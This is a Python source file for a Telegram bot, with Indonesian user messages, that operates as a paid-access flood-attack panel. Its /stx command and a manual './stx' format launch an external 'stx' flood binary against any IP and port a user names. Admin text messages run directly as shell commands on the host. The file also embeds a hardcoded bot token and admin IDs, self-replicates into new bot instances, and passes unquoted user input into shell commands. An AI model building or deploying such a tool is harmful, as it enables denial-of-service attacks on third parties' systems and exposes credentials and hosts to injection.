#!/usr/bin/env python3
import os
import sys
import json
import time
import socket
import psutil
import subprocess
import asyncio
import datetime
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# === CONFIG ===
BOT_TOKEN = '7652296989:AAG1f769Lyi_UI-rXUKgIa7qABkNSWtuC3Y'
ADMINS = {7316824198, 7227755612}          # Admin IDs
USER_DATA_FILE = 'users.json'
BOTS_DATA_FILE = 'bots.json'
LOG_FILE = 'bot_activity.log'
current_dir = os.path.dirname(os.path.abspath(__file__))

# === LOGGING ===
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler(os.path.join(current_dir, LOG_FILE)),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# === USER DATA ===
def load_allowed_users():
    try:
        if os.path.exists(USER_DATA_FILE):
            with open(USER_DATA_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('allowed_users', []))
        return set()
    except Exception as e:
        logger.error(f"Error loading allowed users: {str(e)}")
        return set()

def save_allowed_users():
    try:
        data = {"allowed_users": list(ALLOWED_USERS)}
        with open(USER_DATA_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving allowed users: {str(e)}")

ALLOWED_USERS = load_allowed_users()

# === BOTS DATA ===
def load_secondary_bots():
    try:
        if os.path.exists(BOTS_DATA_FILE):
            with open(BOTS_DATA_FILE, 'r') as f:
                data = json.load(f)
                return data.get('bots', [])
        return []
    except Exception as e:
        logger.error(f"Error loading secondary bots: {str(e)}")
        return []

def save_secondary_bots(bots):
    try:
        data = {"bots": bots}
        with open(BOTS_DATA_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving secondary bots: {str(e)}")

# === ADDBOT FUNCTION === 
async def add_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can add new bots.")
            return

        if not context.args or len(context.args) < 1:
            await update.message.reply_text("Usage: /addbot <bot_token>")
            return

        bot_token = context.args[0]
        
        # Validate token format
        if not (len(bot_token.split(':')) == 2 and bot_token.split(':')[0].isdigit()):
            await update.message.reply_text("Invalid bot token format. Should be like: 1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ")
            return
            
        # Load existing bots
        bots = load_secondary_bots()
        
        # Check if bot already exists
        for bot in bots:
            if bot['token'] == bot_token:
                await update.message.reply_text(f"Bot with this token already exists.")
                return
            
        # Create a new bot file
        bot_id = bot_token.split(':')[0]
        bot_file = f"bot_{bot_id}.py"
        bot_path = os.path.join(current_dir, bot_file)
        
        # Copy the current script but with the new token
        with open(__file__, 'r') as f:
            script_content = f.read()
        
        # Replace the token
        script_content = script_content.replace(f"BOT_TOKEN = '{BOT_TOKEN}'", f"BOT_TOKEN = '{bot_token}'")
        
        # Write to new file
        with open(bot_path, 'w') as f:
            f.write(script_content)
        
        # Make executable
        os.chmod(bot_path, 0o755)
        
        # Start the new bot
        cmd = f"nohup python3 {bot_path} > {bot_id}_log.txt 2>&1 &"
        subprocess.run(cmd, shell=True, cwd=current_dir)
        
        # Add to bots list
        bots.append({
            'token': bot_token,
            'id': bot_id,
            'file': bot_file,
            'added_by': update.effective_user.id,
            'added_at': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        save_secondary_bots(bots)
        
        await update.message.reply_text(f"New bot added and started with ID: {bot_id}")
        logger.info(f"New bot added with ID: {bot_id} by user {update.effective_user.id}")
        
    except Exception as e:
        logger.error(f"Error adding bot: {str(e)}")
        await update.message.reply_text(f"Error adding bot: {str(e)}")

async def list_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can list bots.")
            return
            
        bots = load_secondary_bots()
        
        if not bots:
            await update.message.reply_text("No secondary bots found.")
            return
            
        text = "**Secondary Bots:**\n\n"
        for i, bot in enumerate(bots, 1):
            text += f"{i}. Bot ID: `{bot['id']}`\n"
            text += f"   Added by: `{bot['added_by']}`\n"
            text += f"   Added at: `{bot['added_at']}`\n\n"
            
        await update.message.reply_text(text, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error listing bots: {str(e)}")
        await update.message.reply_text(f"Error listing bots: {str(e)}")

async def remove_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can remove bots.")
            return
        
        if not context.args:
            await update.message.reply_text("Usage: /removebot <bot_id>")
            return
            
        bot_id = context.args[0]
        bots = load_secondary_bots()
        
        found = False
        for i, bot in enumerate(bots):
            if bot['id'] == bot_id:
                # Kill the process
                try:
                    cmd = f"pkill -f 'python3 {bot['file']}'"
                    subprocess.run(cmd, shell=True)
                except:
                    pass
                
                # Remove the file
                try:
                    os.remove(os.path.join(current_dir, bot['file']))
                except:
                    pass
                
                # Remove from list
                bots.pop(i)
                save_secondary_bots(bots)
                found = True
                logger.info(f"Bot with ID {bot_id} removed by user {update.effective_user.id}")
                break
                
        if found:
            await update.message.reply_text(f"Bot with ID {bot_id} removed.")
        else:
            await update.message.reply_text(f"Bot with ID {bot_id} not found.")
        
    except Exception as e:
        logger.error(f"Error removing bot: {str(e)}")
        await update.message.reply_text(f"Error removing bot: {str(e)}")

# === HANDLER ===
async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    try:
        user_id = update.effective_user.id
        message_text = update.message.text.strip()

        # === ADMIN ===
        if user_id in ADMINS:
            command = message_text

            await update.message.reply_text(
                f"User ID: `{user_id}`\n"
                f"Current Directory: `{current_dir}`\n\n"
                f"Executing Command:\n`{command}`",
                parse_mode='Markdown'
            )

            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    cwd=current_dir,
                    timeout=600
                )
                output = result.stdout.strip() + "\n" + result.stderr.strip()
                output = output.strip()

                if "password" in output.lower():
                    await update.message.reply_text("[!] Waiting for password input (manual via VPS).")

                if not output:
                    output = "(No output)"

                for i in range(0, len(output), 4000):
                    await update.message.reply_text(
                        f"User ID: `{user_id}`\n"
                        f"Current Directory: `{current_dir}`\n\n"
                        f"Output:\n{output[i:i+4000]}",
                        parse_mode='Markdown'
                    )
                logger.info(f"Admin command executed by {user_id}: {command}")

            except subprocess.TimeoutExpired:
                await update.message.reply_text("Error: Command timeout after 600 seconds.")
                logger.error(f"Command timeout for user {user_id}: {command}")
            except Exception as e:
                await update.message.reply_text(f"Error: {str(e)}")
                logger.error(f"Command error for user {user_id}: {str(e)}")
            return

        # === USER BIASA ===
        if user_id in ALLOWED_USERS:
            args = message_text.split()

            if len(args) != 6:
                await update.message.reply_text("Format salah. Gunakan:\n`./stx IP PORT DURASI THREAD stx`", parse_mode='Markdown')
                return

            prefix, ip, port, duration, thread, suffix = args

            if prefix != "./stx" or suffix.lower() != "stx":
                await update.message.reply_text("Format salah. Harus diawali './stx' dan diakhiri 'stx'.", parse_mode='Markdown')
                return

            if not port.isdigit() or not duration.isdigit() or not thread.isdigit():
                await update.message.reply_text("PORT, DURATION, dan THREAD harus berupa angka.", parse_mode='Markdown')
                return

            await update.message.reply_text(
                f"User ID: `{user_id}`\n"
                f"Request:\nIP: `{ip}`\nPort: `{port}`\nDuration: `{duration}`s\nThreads: `{thread}`",
                parse_mode='Markdown'
            )

            # Dummy Execution
            command = f"echo Flooding {ip}:{port} for {duration}s with {thread} threads."
            subprocess.Popen(command, shell=True, cwd=current_dir)
            logger.info(f"Flood request by user {user_id}: {ip}:{port} for {duration}s with {thread} threads")
            return

        # === UNAUTHORIZED ===
        await update.message.reply_text("Unauthorized access.")
        logger.warning(f"Unauthorized access attempt by user {user_id}")

    except Exception as e:
        logger.error(f"Error in handle_command: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can use this command.")
            return

        if not context.args:
            await update.message.reply_text("Usage: /adduser <user_id>")
            return

        new_user = int(context.args[0])
        if new_user in ALLOWED_USERS:
            await update.message.reply_text(f"User {new_user} already allowed.")
        else:
            ALLOWED_USERS.add(new_user)
            save_allowed_users()
            await update.message.reply_text(f"User {new_user} added.")
            logger.info(f"User {new_user} added by admin {update.effective_user.id}")
    except Exception as e:
        logger.error(f"Error adding user: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")

async def del_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can use this command.")
            return

        if not context.args:
            await update.message.reply_text("Usage: /deluser <user_id>")
            return

        del_user = int(context.args[0])
        if del_user in ALLOWED_USERS:
            ALLOWED_USERS.remove(del_user)
            save_allowed_users()
            await update.message.reply_text(f"User {del_user} removed.")
            logger.info(f"User {del_user} removed by admin {update.effective_user.id}")
        else:
            await update.message.reply_text("User not found.")
    except Exception as e:
        logger.error(f"Error removing user: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can see allowed users.")
            return

        text = "**Allowed Users:**\n"
        text += "\n".join(str(uid) for uid in ALLOWED_USERS) if ALLOWED_USERS else "(none)"
        await update.message.reply_text(text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error listing users: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")

async def restart_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can restart the bot.")
            return

        await update.message.reply_text("Restarting bot...")
        logger.info(f"Bot restart initiated by admin {update.effective_user.id}")
        await asyncio.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        logger.error(f"Error restarting bot: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")

async def bantuan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "**Command List:**\n\n"
        "**Admin:**\n"
        "`/adduser <id>` - Add user\n"
        "`/deluser <id>` - Delete user\n"
        "`/listuser` - List users\n"
        "`/addbot <token>` - Add new bot\n"
        "`/listbots` - List all secondary bots\n"
        "`/removebot <id>` - Remove a secondary bot\n"
        "`/restartbot` - Restart bot\n"
        "`/vps` - VPS Information\n"
        "`/runtime` - Bot runtime information\n"
        "`/cd <path>` - Change directory\n\n"
        "**User:**\n"
        "`/stx IP PORT DURASI THREAD` - Run flood attack\n"
        "or \n`./stx IP PORT DURASI THREAD stx` manual format"
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def vps_info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMINS:
            await update.message.reply_text("Only admins can access VPS info.")
            return

        uptime_seconds = int(time.time() - psutil.boot_time())
        uptime_hours = uptime_seconds // 3600
        uptime_minutes = (uptime_seconds % 3600) // 60

        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        ram = psutil.virtual_memory()
        ram_total = ram.total // (1024 ** 2)
        ram_used = ram.used // (1024 ** 2)

        cpu_usage = psutil.cpu_percent(interval=1)

        try:
            open_ports = subprocess.check_output("ss -tunlp | grep LISTEN", shell=True).decode()
        except Exception:
            open_ports = "Failed to get open ports."

        # Check if the bot is running as a service
        try:
            service_status = subprocess.check_output("systemctl is-active telegram-bot", shell=True).decode().strip()
        except Exception:
            service_status = "unknown"

        # Check URL connectivity
        try:
            url_status = subprocess.check_output("curl -s -o /dev/null -w '%{http_code}' https://console.dashwave.io/workspace/8060", shell=True).decode().strip()
        except Exception:
            url_status = "error"

        text = (
            f"**VPS Info:**\n\n"
            f"**IP Address:** `{ip_address}`\n"
            f"**Hostname:** `{hostname}`\n"
            f"**Uptime:** `{uptime_hours}h {uptime_minutes}m`\n"
            f"**RAM Usage:** `{ram_used}MB / {ram_total}MB`\n"
            f"**CPU Usage:** `{cpu_usage}%`\n"
            f"**Bot Service:** `{service_status}`\n"
            f"**URL Status:** `{url_status}`\n"
            f"**Open Ports:**\n`{open_ports}`"
        )
        await update.message.reply_text(text, parse_mode='Markdown')
        logger.info(f"VPS info requested by admin {user_id}")

    except Exception as e:
        logger.error(f"Error getting VPS info: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")

async def stx_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id

        if user_id not in ADMINS and user_id not in ALLOWED_USERS:
            await update.message.reply_text("Unauthorized access.")
            logger.warning(f"Unauthorized stx access attempt by user {user_id}")
            return

        if len(context.args) != 4:
            await update.message.reply_text("Format salah. Usage:\n`/stx IP PORT DURASI THREAD`", parse_mode='Markdown')
            return

        ip = context.args[0]
        port = context.args[1]
        duration = context.args[2]
        thread = context.args[3]

        stx_path = "/root/telegram-bot/stx"

        if not os.path.exists(stx_path):
            await update.message.reply_text("Binary `stx` tidak ditemukan di `/root/telegram-bot`.")
            return

        if not os.access(stx_path, os.X_OK):
            await update.message.reply_text("Binary `stx` belum executable. Jalankan `sudo chmod +x /root/telegram-bot/stx`.", parse_mode='Markdown')
            return

        command = f"./stx {ip} {port} {duration} {thread}"
        await update.message.reply_text(
            f"User ID: `{user_id}`\n"
            f"Current Directory: `/root/telegram-bot`\n\n"
            f"Executing Flood:\n`{command}`",
            parse_mode='Markdown'
        )

        # Execute the command in background
        subprocess.Popen(command, shell=True, cwd="/root/telegram-bot")
        logger.info(f"STX command executed by user {user_id}: {ip}:{port} for {duration}s with {thread} threads")

    except Exception as e:
        logger.error(f"Error in stx_handler: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")

async def change_directory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can change the directory.")
            return

        if not context.args:
            await update.message.reply_text("Usage: /cd <directory_path>")
            return

        new_dir = " ".join(context.args)
        if not os.path.exists(new_dir):
            await update.message.reply_text(f"Directory `{new_dir}` does not exist.")
            return

        if not os.path.isdir(new_dir):
            await update.message.reply_text(f"`{new_dir}` is not a directory.")
            return

        current_dir = os.path.abspath(new_dir)
        await update.message.reply_text(f"Directory changed to `{current_dir}`.")
        logger.info(f"Directory changed to {current_dir} by admin {update.effective_user.id}")
    except Exception as e:
        logger.error(f"Error changing directory: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")
        
# Variable to track the start time of the bot
START_TIME = datetime.datetime.utcnow()

async def runtime_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handler to display bot runtime.
    """
    try:
        # Calculate the runtime duration
        current_time = datetime.datetime.utcnow()
        runtime_duration = current_time - START_TIME

        # Format runtime duration
        days, seconds = divmod(runtime_duration.total_seconds(), 86400)
        hours, seconds = divmod(seconds, 3600)
        minutes, seconds = divmod(seconds, 60)

        # Check if the URL is accessible
        try:
            url_check = subprocess.run(
                "curl -s -o /dev/null -w '%{http_code}' https://console.dashwave.io/workspace/8060",
                shell=True,
                capture_output=True,
                text=True
            )
            url_status = url_check.stdout.strip()
        except Exception:
            url_status = "error"

        runtime_message = (
            f"**Bot Runtime:**\n"
            f"`{int(days)}d {int(hours)}h {int(minutes)}m {int(seconds)}s`\n"
            f"**Start Time (UTC):**\n"
            f"`{START_TIME.strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"**URL Status:**\n"
            f"`{url_status}`"
        )
        await update.message.reply_text(runtime_message, parse_mode='Markdown')
        logger.info(f"Runtime info requested by user {update.effective_user.id}")
    except Exception as e:
        logger.error(f"Error getting runtime info: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")

async def ping_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can use this command.")
            return

        url = "https://console.dashwave.io/workspace/8060"
        if context.args:
            url = context.args[0]

        await update.message.reply_text(f"Pinging URL: `{url}`...", parse_mode='Markdown')
        
        try:
            result = subprocess.run(
                f"curl -s -o /dev/null -w '%{{http_code}}' {url}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            status_code = result.stdout.strip()
            
            await update.message.reply_text(
                f"URL: `{url}`\n"
                f"Status Code: `{status_code}`",
                parse_mode='Markdown'
            )
            logger.info(f"URL ping to {url} by admin {update.effective_user.id}: {status_code}")
        except Exception as e:
            await update.message.reply_text(f"Error pinging URL: {str(e)}")
            logger.error(f"Error pinging URL {url}: {str(e)}")
            
    except Exception as e:
        logger.error(f"Error in ping_url handler: {str(e)}")
        await update.message.reply_text(f"Error: {str(e)}")

# === MAIN ===
def main():
    try:
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("adduser", add_user))
        app.add_handler(CommandHandler("deluser", del_user))
        app.add_handler(CommandHandler("listuser", list_users))
        app.add_handler(CommandHandler("addbot", add_bot))
        app.add_handler(CommandHandler("listbots", list_bots))
        app.add_handler(CommandHandler("removebot", remove_bot))
        app.add_handler(CommandHandler("restartbot", restart_bot))
        app.add_handler(CommandHandler("bantuan", bantuan))
        app.add_handler(CommandHandler("vps", vps_info_handler))
        app.add_handler(CommandHandler("stx", stx_handler))
        app.add_handler(CommandHandler("cd", change_directory))
        app.add_handler(CommandHandler("runtime", runtime_handler))
        app.add_handler(CommandHandler("ping", ping_url))
        app.add_handler(MessageHandler(filters.TEXT, handle_command))

        logger.info("Bot started successfully")
        return app
    except Exception as e:
        logger.critical(f"Failed to initialize bot: {str(e)}")
        raise

if __name__ == '__main__':
    print("Bot running...")
    logger.info("Bot starting...")
    
    # Create a heartbeat function to ping the URL periodically
    def heartbeat():
        url = "https://console.dashwave.io/workspace/8060"
        while True:
            try:
                status = subprocess.run(
                    f"curl -s -o /dev/null -w '%{{http_code}}' {url}",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                ).stdout.strip()
                logger.info(f"Heartbeat ping to {url}: {status}")
            except Exception as e:
                logger.error(f"Heartbeat error: {str(e)}")
            time.sleep(60)  # Ping every 60 seconds
    
    # Start heartbeat in a separate thread
    import threading
    heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)
    heartbeat_thread.start()
    
    try:
        app = main()
        app.run_polling(allowed_updates=["message", "edited_message"])
    except Exception as e:
        logger.critical(f"Polling Error: {str(e)}")
        try:
            # Try to restart the bot
            logger.info("Attempting to restart the bot...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except Exception as restart_error:
            logger.critical(f"Failed to restart: {str(restart_error)}")
